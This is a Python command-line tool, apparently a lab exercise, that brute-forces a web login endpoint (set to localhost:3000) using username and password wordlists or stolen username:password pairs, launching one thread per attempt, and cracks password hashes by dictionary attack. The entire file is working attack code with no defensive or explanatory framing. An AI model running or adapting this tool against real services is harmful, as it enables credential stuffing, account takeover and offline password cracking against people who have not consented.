import requests
import argparse
import hashlib
import threading
import os
from itertools import product

# API Endpoint
URL = "http://localhost:3000/login"

# Function to attempt login
def attempt_login(username, password):
    response = requests.post(URL, json={"username": username, "password": password})

    if response.status_code == 200 and "Login successful" in response.text:
        print(f"\n[✅] Credentials Found: {username}:{password}")
        os._exit(0)

    print(f"[-] Failed: {username}:{password}")

# perform brute-force attack using usernames and passwords lists
def brute_force(usernames_file, passwords_file):
    if not os.path.exists(usernames_file) or not os.path.exists(passwords_file):
        print(f"[❌] Error: Ensure both {usernames_file} and {passwords_file} exist.")
        return

    print(f"[🔹] Loading usernames from {usernames_file}")
    print(f"[🔹] Loading passwords from {passwords_file}")

    with open(usernames_file, "r", encoding="utf-8") as ufile, open(passwords_file, "r", encoding="utf-8") as pfile:
        usernames = [u.strip() for u in ufile.readlines()]
        passwords = [p.strip() for p in pfile.readlines()]

        print(f"[🔹] Trying {len(usernames) * len(passwords)} combinations...")

        for username, password in product(usernames, passwords):
            thread = threading.Thread(target=attempt_login, args=(username, password))
            thread.start()

# perform a brute-force attack using username:password pairs
def brute_force_with_creds(creds_file):
    if not os.path.exists(creds_file):
        print(f"[❌] Error: Credentials file '{creds_file}' not found.")
        return

    print(f"[🔹] Loading credentials from {creds_file}")

    with open(creds_file, "r", encoding="utf-8") as file:
        for line in file:
            try:
                username, password = line.strip().split(":")
                thread = threading.Thread(target=attempt_login, args=(username, password))
                thread.start()
            except ValueError:
                print(f"[❌] Skipping invalid line: {line.strip()} (Must be in username:password format)")

# perform hash-based attack
def hash_attack(hash_file, hash_type, wordlist):
    if not os.path.exists(hash_file) or not os.path.exists(wordlist):
        print(f"[❌] Error: Ensure both hash file and wordlist exist.")
        return

    print(f"[🔹] Cracking hashes using {hash_type}...")

    with open(hash_file, "r", encoding="utf-8") as hfile:
        hashes = {h.strip() for h in hfile}

    with open(wordlist, "r", encoding="utf-8") as wfile:
        for word in wfile:
            word = word.strip()
            hashed_word = hashlib.new(hash_type, word.encode()).hexdigest()
            if hashed_word in hashes:
                print(f"[✅] Password Found: {word} -> {hashed_word}")
                hashes.remove(hashed_word)
                if not hashes:
                    print("[🔥] All hashes cracked!")
                    return

    print("[X] No matches found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced Brute-Force and Hash Cracker")
    parser.add_argument("-u", "--usernames-file", help="Path to usernames list")
    parser.add_argument("-p", "--passwords-file", help="Path to passwords list")
    parser.add_argument("-c", "--creds-file", help="Path to credentials file (username:password)")
    parser.add_argument("-hf", "--hash-file", help="Path to hash file (for hash cracking)")
    parser.add_argument("-ht", "--hash-type", help="Hash algorithm (md5, sha1, sha256, etc.)")
    parser.add_argument("-w", "--wordlist", help="Path to wordlist (for hash cracking)")

    args = parser.parse_args()

    if args.usernames_file and args.passwords_file:
        brute_force(args.usernames_file, args.passwords_file)
    elif args.creds_file:
        brute_force_with_creds(args.creds_file)
    elif args.hash_file and args.hash_type and args.wordlist:
        hash_attack(args.hash_file, args.hash_type, args.wordlist)
    else:
        print("[❌] Invalid usage. Use -h for help.")